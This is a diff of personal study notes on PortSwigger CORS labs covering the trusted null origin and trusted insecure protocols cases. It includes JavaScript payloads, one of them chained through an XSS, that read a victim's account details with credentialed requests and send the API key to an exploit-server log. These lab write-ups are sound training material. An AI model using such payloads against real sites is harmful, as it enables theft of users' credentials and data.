@@ -142,10 +142,9 @@ You can log in to your own account using the following credentials: `wiener:pet
 	
 3. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` (which is reflected in host header) with your unique lab URL:
 	![](Pasted%20image%2020250304114703.png)
-4. Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL. Go back to the exploit server and click **Deliver exploit to victim**. Click **Access log**, retrieve and submit the victim's API key to complete the lab.
 
 
-## 2. Trusted null origin
+# 2. Trusted null origin
 This website has an insecure CORS configuration in that it trusts the "null" origin.
 
 To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
@@ -159,11 +158,11 @@ You can log in to your own account using the following credentials: `wiener:pet
     <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);  //(host that u want to replicate)
     req.withCredentials = true;
     req.send();
     function reqListener() {
-        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+        location='YOUR-EXPLOIT-SERVER/log?key='+encodeURIComponent(this.responseText); //attack server where exfiltrate
     };
 	</script>"></iframe>
     ```
@@ -172,3 +171,42 @@ You can log in to your own account using the following credentials: `wiener:pet
 4. Click "View exploit". Observe that the exploit works - you have landed on the log page and your API key is in the URL. Go back to the exploit server and click "Deliver exploit to victim". Click "Access log", retrieve and submit the victim's API key to complete the lab.
 
 **Workflow:**
+1. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS. (also notice that injecting origin with a random value url is not reflected)
+	![](Pasted%20image%2020250307022039.png)
+
+2. Send the request to Burp Repeater, and resubmit it with the added header `Origin: null.` Observe that the "null" origin is reflected in the `Access-Control-Allow-Origin` header.
+	![](Pasted%20image%2020250307022336.png)
+	
+3. Go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with the URL for your unique lab URL and `YOUR-EXPLOIT-SERVER-ID` with the exploit server ID:
+	![](Pasted%20image%2020250307022810.png)
+
+
+# 3. Trusted insecure protocols
+This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.
+
+To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
+You can log in to your own account using the following credentials: `wiener:peter`
+
+**Analysis**:
+1. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
+2. Send the request to Burp Repeater, and resubmit it with the added header `Origin: http://subdomain.lab-id` where `lab-id` is the lab domain name. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
+3. Open a product page, click **Check stock** and observe that it is loaded using a HTTP URL on a subdomain. Observe that the `productID` parameter is vulnerable to XSS.
+4. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with your unique lab URL and `YOUR-EXPLOIT-SERVER-ID` with your exploit server ID:
+```javascript
+<script>
+    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
+5. Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL. Go back to the exploit server and click **Deliver exploit to victim**. Click **Access log**, retrieve and submit the victim's API key to complete the lab.
+
+Workflow:
+1. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
+	![](Pasted%20image%2020250307024846.png)
+2. Send the request to Burp Repeater, and resubmit it with the added header `Origin: http://subdomain.lab-id` where `lab-id` is the lab domain name. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
+	![](Pasted%20image%2020250307025013.png)
+3. Open a product page, click **Check stock** and observe that it is loaded using a HTTP URL on a subdomain. Observe that the `productID` parameter is vulnerable to XSS.
+	![](Pasted%20image%2020250307025127.png)
+	![](Pasted%20image%2020250307025211.png)
+	![](Pasted%20image%2020250307025744.png)
+4. Go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with your unique lab URL and `YOUR-EXPLOIT-SERVER-ID` with your exploit server ID:
+	![](Pasted%20image%2020250307025953.png)
